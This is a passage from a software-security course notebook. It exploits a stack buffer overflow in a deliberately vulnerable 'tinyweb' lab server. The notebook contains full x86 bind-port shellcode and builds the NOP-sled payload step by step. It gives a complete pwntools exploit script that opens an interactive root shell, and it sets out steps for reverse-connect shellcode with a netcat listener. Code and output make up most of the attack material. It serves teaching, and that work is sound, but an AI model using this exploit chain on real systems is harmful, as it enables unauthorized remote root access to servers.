    "- also can use `ps` and `grep` commands to get the process id\n",
    "\n",
    "```bash\n",
    "root@tinyweb:/var/www# ps aux | grep tinyweb\n",
    "root          16  0.0  0.1   6268  2432 pts/0    S    20:09   0:00 ./tinyweb.exe\n",
    "\n",
    "```\n",
    "\n",
    "- run gdb on the tinyweb.exe process id\n",
    "\n",
    "```\n",
    "$ sudo gdb -q --pid=[tinywebpid] --symbols=./tinyweb.exe\n",
    "```\n",
    "\n",
    "- use gdb to examine memory and addresses\n",
    "\n",
    "```bash\n",
    "root@tinyweb:/var/www# gdb -q --pid=16 --symbols=./tinyweb.exe\n",
    "Reading symbols from ./tinyweb.exe...\n",
    "Attaching to process 16\n",
    "Load new symbol table from \"/var/www/tinyweb.exe\"? (y or n) y\n",
    "Reading symbols from /var/www/tinyweb.exe...\n",
    "Reading symbols from /lib32/libstdc++.so.6...\n",
    "(No debugging symbols found in /lib32/libstdc++.so.6)\n",
    "Reading symbols from /lib32/libgcc_s.so.1...\n",
    "(No debugging symbols found in /lib32/libgcc_s.so.1)\n",
    "Reading symbols from /lib32/libc.so.6...\n",
    "(No debugging symbols found in /lib32/libc.so.6)\n",
    "Reading symbols from /lib32/libm.so.6...\n",
    "(No debugging symbols found in /lib32/libm.so.6)\n",
    "Reading symbols from /lib/ld-linux.so.2...\n",
    "(No debugging symbols found in /lib/ld-linux.so.2)\n",
    "[Thread debugging using libthread_db enabled]\n",
    "Using host libthread_db library \"/lib/x86_64-linux-gnu/libthread_db.so.1\".\n",
    "0xf7fc4579 in __kernel_vsyscall ()\n",
    "\n",
    "\n",
    "(gdb) list main  # list 10 lines around main\n",
    "21      int get_file_size(int); // returns the filesize of open file descriptor\n",
    "22      void send_file_not_found(const int); // send file not found error\n",
    "23      void send_file(const int, char *); // send file/resource requested\n",
    "24      void send_buffer_address(const int, char *); // send buffer address\n",
    "25\n",
    "26      int main(void) {\n",
    "27         int sockfd, new_sockfd, yes=1; \n",
    "28         struct sockaddr_in host_addr, client_addr;   // my address information\n",
    "29         socklen_t sin_size;\n",
    "30\n",
    "\n",
    "(gdb) list 75 # list 10 lines around line 75\n",
    "70\n",
    "71              char address[100];\n",
    "72              sprintf(address, \"Request buffer @ %p\\r\\n\", request);\n",
    "73              printf(\"%s\", address);\n",
    "74              // receive one line from client and store it into request buffer\n",
    "75              length = recv_line(sockfd, request);\n",
    "76\n",
    "77              printf(\"Got request from %s:%d \\\"%s\\\"\\n\", inet_ntoa(client_addr_ptr->sin_addr), ntohs(client_addr_ptr->sin_port), request);\n",
    "78              printf(\"Received: %d bytes\\n\", length);\n",
    "                                                                    \n",
    "\n",
    "$ break 75 # break at recv_line function that has overrun issue\n",
    "\n",
    "$ continue # make a get request using a terminal or browser to hit the breakpoint\n",
    "(gdb) p &request\n",
    "$1 = (char (*)[500]) 0xffffd460 # Note the address of request variable \n",
    "\n",
    "(gdb) p request\n",
    "$7 = \"GET /image.jpg\\000HTTP/1.1\\000\\n\\000@\\332\\377\\367\\000\\000\\000\\000\\000\\320\\377\\367\\000\\000\\000\\000\\000\\320\\377\\367 \\000\\000\\000\\000\\000\\000\\000\\224\\002\\375\\367\\000\\000\\000\\000\\024\\324\\377\\377\\240\\333\\377\\367\\003\\000\\000\\000\\260\\324\\377\\377\\000\\000\\000\\000\\000\\000\\000\\000\\377\\377\\377\\377@\\332\\377\\367\\377\\377\\377\\377@\\352\\373\\367Pf\\374\\367\\b\\326\\377\\367\\000\\000\\000\\000\\000\\320\\377\\367 \\000\\000\\000\\000\\000\\000\\000\\020\\000\\000\\000\\b\\326\\377\\367\\216F\\375\\367\\000\\260\\377\\367\\000\\000\\000\\000\\373\\203\\264\\367D@\\325\\367@\\352\\373\\367 o\\375\\367\\373\\203\\264\\367@\\352\\373\\367P\\324\\377\\377\\f\\354\\373\\367`\\372\\373\\367\\001\\000\\000\\000\\001\\000\\000\\000\\000\\000\\000\\000\\t\\000\\000\\000\\256\\022\"...\n",
    "\n",
    "(gdb) p $ebp+4\n",
    "$2 = (void *) 0xffffd66c\n",
    "\n",
    "(gdb) x/x $ebp+4\n",
    "0xffffd66c:     0x08049a87\n",
    "\n",
    "(gdb) bt # find the return address to main\n",
    "\n",
    "# return address to main/caller is also stored at $ebp+4\n",
    "\n",
    "(gdb) x/x $ebp+4\n",
    "0xffffb97c:     0x08049a77\n",
    "\n",
    "# OFFSET to return address\n",
    "(gdb) p/d (char *)($ebp+4) - (char *)&request\n",
    "$3 = 524\n",
    "\n",
    "```\n",
    "\n",
    "- exit the debugger and rerun the server from the same Terminal"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Remote Exploit\n",
    "\n",
    "- local exploit is not practical in real-world, why?\n",
    "- let's create a port binding shellcode so the attacker can remotely login to the victim once pwned\n",
    "- use a different VM or system as an attacker machine\n",
    "- create Port Binding Shellcode Exploit\n",
    "- Generate Shellcode using GDB PEDA\n",
    "- write the binary shellcode to a file\n",
    "- add about 100 bytes to the beginning address of `request` buffer to get the working landing address\n",
    "\n",
    "### Generate port binding shellcode\n",
    "\n",
    "- make sure to provide IP of the target/victim system and available ports above 1024\n",
    "- gdb-peda$ shellcode generate x86/linux bindport <port> <ip>\n",
    "- find victim's IP address\n",
    "- pick a port, e.g. 9999 # that's unlikely in use by the Tinyweb server\n",
    "- find the IP of tinyweb server to generate the shellcode\n",
    "- e.g., 192.168.144.2 is the IP of my Docker running the tinweb server\n",
    "    \n",
    "```bash\n",
    "┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/server/tinyweb]\n",
    "└─$ ifconfig        \n",
    "eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n",
    "        inet 192.168.47.130  netmask 255.255.255.0  broadcast 192.168.47.255\n",
    "        inet6 fe80::ed5d:b4c2:d275:17ca  prefixlen 64  scopeid 0x20<link>\n",
    "        ether 00:0c:29:8a:20:62  txqueuelen 1000  (Ethernet)\n",
    "        RX packets 47707  bytes 68315780 (65.1 MiB)\n",
    "        RX errors 0  dropped 0  overruns 0  frame 0\n",
    "        TX packets 4863  bytes 456804 (446.0 KiB)\n",
    "        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0\n",
    "\n",
    "\n",
    "┌──(kali㉿K)-[~]\n",
    "└─$ gdb -q           \n",
    "gdb-peda$ shellcode generate\n",
    "Available shellcodes:                                                                          \n",
    "    x86/linux exec                                                                           \n",
    "    x86/linux bindport                                                                       \n",
    "    x86/linux connect                                                                       \n",
    "    x86/bsd exec                                                                             \n",
    "    x86/bsd bindport\n",
    "    x86/bsd connect\n",
    "\n",
    "gdb-peda$ shellcode generate x86/linux bindport 9999 192.168.100.100\n",
    "# x86/linux/bindport: 84 bytes\n",
    "# port=9999, host=192.168.100.100\n",
    "shellcode = (\n",
    "    \"\\x31\\xdb\\x53\\x43\\x53\\x6a\\x02\\x6a\\x66\\x58\\x99\\x89\\xe1\\xcd\\x80\\x96\"\n",
    "    \"\\x43\\x52\\x66\\x68\\x27\\x0f\\x66\\x53\\x89\\xe1\\x6a\\x66\\x58\\x50\\x51\\x56\"\n",
    "    \"\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xd1\\xe3\\xcd\\x80\\x52\\x52\\x56\\x43\\x89\\xe1\"\n",
    "    \"\\xb0\\x66\\xcd\\x80\\x93\\x6a\\x02\\x59\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\xb0\"\n",
    "    \"\\x0b\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x53\"\n",
    "    \"\\x89\\xe1\\xcd\\x80\"\n",
    ")\n",
    "\n",
    "gdb-peda$ quit\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "/home/kali/projects/SoftwareSecurity/demos/server/tinyweb\r\n"
     ]
    }
   ],
   "source": [
    "! pwd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 68,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "All done! Binary file created: port_bind_shellcode.bin\n"
     ]
    }
   ],
   "source": [
    "# FIXME: update your binary shellcode from PEDA...\n",
    "# x86/linux/bindport: 84 bytes\n",
    "# port=9999, host=192.168.100.100\n",
    "shellcode = (\n",
    "    \"\\x31\\xdb\\x53\\x43\\x53\\x6a\\x02\\x6a\\x66\\x58\\x99\\x89\\xe1\\xcd\\x80\\x96\"\n",
    "    \"\\x43\\x52\\x66\\x68\\x27\\x0f\\x66\\x53\\x89\\xe1\\x6a\\x66\\x58\\x50\\x51\\x56\"\n",
    "    \"\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xd1\\xe3\\xcd\\x80\\x52\\x52\\x56\\x43\\x89\\xe1\"\n",
    "    \"\\xb0\\x66\\xcd\\x80\\x93\\x6a\\x02\\x59\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\xb0\"\n",
    "    \"\\x0b\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x53\"\n",
    "    \"\\x89\\xe1\\xcd\\x80\"\n",
    ").encode('latin-1')\n",
    "\n",
    "\n",
    "#FIXME: provide abs or relative path/file_name of the binary file to create\n",
    "fileName = \"port_bind_shellcode.bin\"\n",
    "\n",
    "# open and write binary to the file\n",
    "\n",
    "with open(fileName, 'wb') as fout:\n",
    "\tfout.write(shellcode)\n",
    "\n",
    "print(f'All done! Binary file created: {fileName}') "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 69,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "00000000  31 db 53 43 53 6a 02 6a  66 58 99 89 e1 cd 80 96  |1.SCSj.jfX......|\r\n",
      "00000010  43 52 66 68 27 0f 66 53  89 e1 6a 66 58 50 51 56  |CRfh'.fS..jfXPQV|\r\n",
      "00000020  89 e1 cd 80 b0 66 d1 e3  cd 80 52 52 56 43 89 e1  |.....f....RRVC..|\r\n",
      "00000030  b0 66 cd 80 93 6a 02 59  b0 3f cd 80 49 79 f9 b0  |.f...j.Y.?..Iy..|\r\n",
      "00000040  0b 52 68 2f 2f 73 68 68  2f 62 69 6e 89 e3 52 53  |.Rh//shh/bin..RS|\r\n",
      "00000050  89 e1 cd 80                                       |....|\r\n",
      "00000054\r\n"
     ]
    }
   ],
   "source": [
    "! hexdump -C port_bind_shellcode.bin"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Use Python script to create binary shellcode file\n",
    "\n",
    "- alternatively, a Python script `shellcode_writer.py`is provided in shellcode folder to simplify generating binary shellcode file \n",
    "- can simply copy paste shellcode generated by PEDA and update the filename\n",
    "- the program when run will generate the binary file with shellcode"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 70,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "84 port_bind_shellcode.bin\r\n"
     ]
    }
   ],
   "source": [
    "! wc -c port_bind_shellcode.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 71,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "494"
      ]
     },
     "execution_count": 71,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# lets create the exploit code to send to the server\n",
    "# find the size of the NOP sled; repeat the buffer address 50 times\n",
    "# add at least 4 bytes to offset to overwrite the return address\n",
    "778-84-(50*4)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 72,
   "metadata": {},
   "outputs": [],
   "source": [
    "! python3 -c 'import sys; sys.stdout.buffer.write(b\"\\x90\"*494)' > port_bind_exploit.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 73,
   "metadata": {},
   "outputs": [],
   "source": [
    "# let's append the shellcode\n",
    "! cat port_bind_shellcode.bin >> port_bind_exploit.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 74,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0\r\n"
     ]
    }
   ],
   "source": [
    "# difference in buffer address in gdb and not in gdb\n",
    "# no difference because gdb anaylized live process ran from Terminal\n",
    "! python -c 'print(0xffffd366 - 0xffffd366)'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 75,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0xffffd3fc\r\n"
     ]
    }
   ],
   "source": [
    "# can't have 00 in the address\n",
    "! python -c 'print(hex(0xffffd366+150))'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 76,
   "metadata": {},
   "outputs": [],
   "source": [
    "# let's write the repeated return address: 0xffffd560\n",
    "! python3 -c 'import sys; sys.stdout.buffer.write(b\"\\xfc\\xd3\\xff\\xff\"*50)' >> port_bind_exploit.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 77,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "778 port_bind_exploit.bin\r\n"
     ]
    }
   ],
   "source": [
    "! wc -c port_bind_exploit.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 78,
   "metadata": {},
   "outputs": [],
   "source": [
    "# let's append the end of request delimeter \\r\\n\n",
    "! python3 -c 'import sys; sys.stdout.buffer.write(b\"\\r\\n\")' >> port_bind_exploit.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 79,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "780 port_bind_exploit.bin\r\n"
     ]
    }
   ],
   "source": [
    "! wc -c port_bind_exploit.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 80,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "00000000  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|\r\n",
      "*\r\n",
      "000001e0  90 90 90 90 90 90 90 90  90 90 90 90 90 90 31 db  |..............1.|\r\n",
      "000001f0  53 43 53 6a 02 6a 66 58  99 89 e1 cd 80 96 43 52  |SCSj.jfX......CR|\r\n",
      "00000200  66 68 27 0f 66 53 89 e1  6a 66 58 50 51 56 89 e1  |fh'.fS..jfXPQV..|\r\n",
      "00000210  cd 80 b0 66 d1 e3 cd 80  52 52 56 43 89 e1 b0 66  |...f....RRVC...f|\r\n",
      "00000220  cd 80 93 6a 02 59 b0 3f  cd 80 49 79 f9 b0 0b 52  |...j.Y.?..Iy...R|\r\n",
      "00000230  68 2f 2f 73 68 68 2f 62  69 6e 89 e3 52 53 89 e1  |h//shh/bin..RS..|\r\n",
      "00000240  cd 80 fc d3 ff ff fc d3  ff ff fc d3 ff ff fc d3  |................|\r\n",
      "00000250  ff ff fc d3 ff ff fc d3  ff ff fc d3 ff ff fc d3  |................|\r\n",
      "*\r\n",
      "00000300  ff ff fc d3 ff ff fc d3  ff ff 0d 0a              |............|\r\n",
      "0000030c\r\n"
     ]
    }
   ],
   "source": [
    "! hexdump -C port_bind_exploit.bin"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Exploit the Tinyweb Server\n",
    "\n",
    "- rerun the Tinyweb server on the target machine\n",
    "- send `port_bind_exploit.bin` from a different VM to the target machine\n",
    "    - this mimics the real-world server exploitation \n",
    "- connect to the victim port 9999 using netcat\n",
    "- read the flag stored in secret.txt file\n",
    "\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿K)-[~/projects/NetworkSecurity]\n",
    "└─$ cat port_bind_exploit.bin | nc -v 192.168.100.100 80 \n",
    "```\n",
    "\n",
    "- Tinyweb when exploited will run the port binding shellcode at port 9999 as shown below\n",
    "\n",
    "```bash\n",
    "root@tinyweb:/var/www# make run\n",
    "./tinyweb.exe\n",
    "Accepting web requests on port 80\n",
    "Request buffer @ 0xffffd400\n",
    "Got request from 192.168.144.1:33034 \"GET /buffer HTTP/1.1\"\n",
    "Received: 20 bytes\n",
    " 200 OK\n",
    "Request buffer @ 0xffffd400\n",
    "Got request from 192.168.144.1:55104 \"����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������1�SCSjjfX����CRfh'fS��jfXPQV���f��RRVC���f�jY�?Iy��\n",
    "                                                                           Rh//shh/bin��RS��x���x���x���x���x���x���x���x���x���x���x���x���x���x���x���x���x���x���x���x���x���x���x���x���x���x���x���x���x���x���x���x���x���x���x���x���x���x���x���x���x���x���x���\"\n",
    "Received: 528 bytes\n",
    " NOT HTTP!\n",
    "```\n",
    "\n",
    "- use another terminal from the attcker machine to netcat to port 9999\n",
    "- once connected, you'll not see the prompt `$` `or `#`, but you can still issue commands on the pwned target\n",
    "\n",
    "```bash\n",
    "(base) ┌──(kali㉿kali)-[~/…/SoftwareSecurity/demos/server/tinyweb]\n",
    "└─$ nc 192.168.100.100 9999\n",
    "whoami\n",
    "root\n",
    "date\n",
    "Fri Apr 18 01:16:49 UTC 2025\n",
    "ls   \n",
    "Dockerfile\n",
    "Makefile\n",
    "docker-compose.yaml\n",
    "exploit.py\n",
    "junk.txt\n",
    "local_exploit.bin\n",
    "main.cpp\n",
    "main.o\n",
    "pattern.txt\n",
    "peda-session-tinyweb.exe.txt\n",
    "port_bind_exploit.bin\n",
    "port_bind_shellcode.bin\n",
    "port_bind_shellcode.bin1\n",
    "tinyweb.exe\n",
    "util\n",
    "webroot\n",
    "cat /secret.txt \n",
    "flag{!Softwaresecurity is fun!}\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Exploit using Pwntools\n",
    "\n",
    "- Pwntools library helps us automate most of the steps using a Python script\n",
    "- let's use pwntools to exploit the remote tinyweb server\n",
    "- running pwntools interactively from Jupyter Notebook doesn't seem to work; connection autoshuts down\n",
    "- open `demos/tinyweb/exploit.py` file\n",
    "- fix all the FIXMEs and run it to exploit the target"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 81,
   "metadata": {},
   "outputs": [],
   "source": [
    "# it may fail from conda environment!!!!!\n",
    "from pwn import *"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 83,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[x] Opening connection to 192.168.100.100 on port 80\n",
      "[x] Opening connection to 192.168.100.100 on port 80: Trying 192.168.100.100\n",
      "[+] Opening connection to 192.168.100.100 on port 80: Done\n"
     ]
    }
   ],
   "source": [
    "# create a socket connection to target\n",
    "io = connect('192.168.100.100', 80)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 84,
   "metadata": {},
   "outputs": [],
   "source": [
    "# send some data..\n",
    "io.send(b'hello \\r\\n')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 86,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#!/usr/bin/env python3\r\n",
      "\r\n",
      "from pwn import *\r\n",
      "\r\n",
      "# FIXME\r\n",
      "target = '192.168.100.100'\r\n",
      "\r\n",
      "# FIXME\r\n",
      "service_port = 80\r\n",
      "\r\n",
      "# FIXME - bind PORT to connect to when the shellcode is executed\r\n",
      "bind_port = 9999\r\n",
      "\r\n",
      "# FIXME\r\n",
      "# x86/linux/bindport: 84 bytes\r\n",
      "# port=9999, host=192.168.100.100\r\n",
      "shellcode = (\r\n",
      "    \"\\x31\\xdb\\x53\\x43\\x53\\x6a\\x02\\x6a\\x66\\x58\\x99\\x89\\xe1\\xcd\\x80\\x96\"\r\n",
      "    \"\\x43\\x52\\x66\\x68\\x27\\x0f\\x66\\x53\\x89\\xe1\\x6a\\x66\\x58\\x50\\x51\\x56\"\r\n",
      "    \"\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xd1\\xe3\\xcd\\x80\\x52\\x52\\x56\\x43\\x89\\xe1\"\r\n",
      "    \"\\xb0\\x66\\xcd\\x80\\x93\\x6a\\x02\\x59\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\xb0\"\r\n",
      "    \"\\x0b\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x53\"\r\n",
      "    \"\\x89\\xe1\\xcd\\x80\"\r\n",
      ").encode('latin-1')\r\n",
      "\r\n",
      "# size of nop sled = total buffer - shellcode size - repeated return address\r\n",
      "# FIXME\r\n",
      "nop_address = p32(0xffffd366) # pack little endian\r\n",
      "\r\n",
      "# FIXME\r\n",
      "offset_to_ret_add = 774\r\n",
      "\r\n",
      "# FIXME\r\n",
      "repeat_address = 50\r\n",
      "\r\n",
      "repeated_return_address = nop_address*repeat_address\r\n",
      "\r\n",
      "total_exploit_len = offset_to_ret_add + 4 # offset + 4 bytes to overwrite return address\r\n",
      "\r\n",
      "sled_len = total_exploit_len - len(shellcode) - (repeat_address*4)\r\n",
      "print(f'{sled_len=}')\r\n",
      "NOPSled = b\"\\x90\"*sled_len # asm('nop')\r\n",
      "eol = b'\\r\\n' # required for Web server to end request\r\n",
      "\r\n",
      "# create exploit code\r\n",
      "exploit_code = NOPSled + shellcode + repeated_return_address + eol\r\n",
      "print(f'sending exploit with len {len(exploit_code)}')\r\n",
      "\r\n",
      "\r\n",
      "io = connect(target, service_port)\r\n",
      "# send the exploit code to target\r\n",
      "io.send(exploit_code)\r\n",
      "wait = 5\r\n",
      "print(f'Waiting {wait} seconds to execute the shellcode and open {bind_port}')\r\n",
      "import time\r\n",
      "time.sleep(wait)\r\n",
      "\r\n",
      "# target exploited...\r\n",
      "print(f'Target {target} exploited... connecting to port: {bind_port}')\r\n",
      "\r\n",
      "\r\n",
      "\r\n",
      "\r\n",
      "# now connect to the shellcode PORT on victim\r\n",
      "io = connect(target, bind_port)\r\n",
      "io.interactive()\r\n",
      "\r\n",
      "\r\n"
     ]
    }
   ],
   "source": [
    "# tinyweb exploit code in Python\n",
    "! cat exploit.py"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- run the exploit code from its directory\n",
    "\n",
    "```bash                                                                                      ┌──(kali㉿kali)-[~/…/SoftwareSecurity/demos/server/tinyweb]\n",
    "└─$ python exploit.py\n",
    "sled_len=494\n",
    "sending exploit with len 780\n",
    "[+] Opening connection to 192.168.100.100 on port 80: Done\n",
    "Waiting 5 seconds to execute the shellcode and open 9999\n",
    "Target 192.168.100.100 exploited... connecting to port: 9999\n",
    "[+] Opening connection to 192.168.100.100 on port 9999: Done\n",
    "[*] Switching to interactive mode\n",
    "$ whoami\n",
    "root\n",
    "$ date\n",
    "Fri Apr 18 01:47:02 UTC 2025\n",
    "$ cat /secret.txt\n",
    "flag{!Softwaresecurity is fun!}\n",
    "$ exit\n",
    "[*] Got EOF while reading in interactive\n",
    "$ \n",
    "$ \n",
    "[*] Closed connection to 192.168.100.100 port 9999\n",
    "[*] Got EOF while sending in interactive\n",
    "[*] Closed connection to 192.168.100.100 port 80\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Remote Exploit - Connect-back Shellcode\n",
    "\n",
    "- connecting to the victim machine is not easy due to firewall and IDS, IPS, etc.\n",
    "- however, outgoing connection from target is typically allowed\n",
    "- use the following exploit\n",
    "- use a different VM or system as an attacker machine\n",
    "- create connect back (TCP Reverse connect) shellcode\n",
    "- generate Shellcode using GDB PEDA\n",
    "    - IP address must be the address of the attacker machine that victim connect back to\n",
    "    - Port can be any available port on the attacker machine for victim to connect back to\n",
    "        - certain target port may be blocked by firewall and security Policy\n",
    "- add about 100 bytes to the beginning address of request to get the working landing address\n",
    "\n",
    "\n",
    "```bash\n",
    "$ gdb -q\n",
    "gdb-peda$ shellcode generate x86/linux connect <attacker_port> <attacker_ip>\n",
    "\n",
    "```\n",
    "\n",
    "- write shellcode to a file as binary one line at a time\n",
    "- do one line at a time as following or use shellcode_writer.py script in shellcode folder\n",
    "\n",
    "```bash\n",
    "$ python3 -c 'import sys; sys.stdout.buffer.write(b\"shellcode line1\")' > reverse_tcp.bin\n",
    "$ python3 -c 'import sys; sys.stdout.buffer.write(b\"shellcode line2\")' >> reverse_tcp.bin\n",
    "...\n",
    "...\n",
    "```\n",
    "\n",
    "- calculate `n` and `m` to make exploit code\n",
    "    - `[<NOP sled>*n + len(reverse_tcp.bin) + <return address>*m]`\n",
    "- repeated return address = `<address of request> + 100`\n",
    "- run a server on attacker machine so the victim can connect back to it\n",
    "- port must be the same as used in the exploit code\n",
    "\n",
    "```bash\n",
    "$ nc -v -l -p <attacker_port>\n",
    "```\n",
    "\n",
    "- create the exploit code (connect_back_exploit_code.bin) as demonstrated in local exploit\n",
    "- send the expploit code to the Tinyweb server using netcat\n",
    "\n",
    "```bash\n",
    "$ cat connect_back_exploit_code.bin | nc -v <target ip> 80\n",
    "```\n",
    "- check the terminal running the netcat server on the attacker machine to verify if the victim is exploited and connected back to the attacker \n",
    "- interact with the victim"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
